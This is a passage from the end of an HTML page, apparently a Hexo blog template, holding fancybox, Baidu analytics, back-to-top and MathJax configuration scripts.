      $(this).attr('rel', 'article' + i);
    });
  });
  if($.fancybox){
    $('.fancybox').fancybox();
  }
}); 
</script>



<!-- Analytics Begin -->



<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?e6d1f421bbc9962127a50488f9ed37d1";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>



<!-- Analytics End -->

<!-- Totop Begin -->

	<div id="totop">
	<a title="Back to Top"><img src="/img/scrollup.png"></a>
	</div>
	<script src="/js/totop.js"></script>

<!-- Totop End -->

<!-- MathJax Begin -->
<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


<!-- MathJax End -->

<!-- Tiny_search Begin -->

<!-- Tiny_search End --><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config("");
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="custom_mathjax_source">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->

  </body>
</html>
